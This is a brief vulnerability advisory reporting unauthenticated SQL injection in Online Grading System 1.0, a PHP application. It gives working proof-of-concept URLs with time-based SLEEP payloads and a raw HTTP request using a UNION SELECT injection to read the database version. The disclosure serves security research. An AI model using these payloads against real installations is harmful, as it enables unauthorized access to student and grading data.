ONLINE GRADING SYSTEM 1.0 SQLI

Disclosure date: 11/22/19

Online Grading System is vulnerable to unauthenticated SQL injection and can allow remote attackers to execute arbitrary SQL commands via the student, instructor, department, room, class, and user, parameters.

download:

https://www.sourcecodester.com/php/13711/online-grading-system-using-phpmysqli.html

Proof of Concept:

`http://192.168.118.129/admin/modules/subject/index.php?view=edit&id=466 and SLEEP(3)`
`http://192.168.118.129/admin/modules/course/index.php?view=edit&id=50 and SLEEP(3)`
`http://192.168.118.129/admin/modules/inst_front/index.php?view=grade&gradeId=1 and SLEEP(3)`

POC:
```
GET /admin/modules/course/index.php?view=edit&id=50%20and%201=2%20union%20select%201,@@version,3,4,5,6 HTTP/1.1
Host: 192.168.118.129
```
![](http://img.cdn.cuittk.cn/l513fyfhnsqyqi6npf9xqgiepn.png)

by h1tler@knownsec
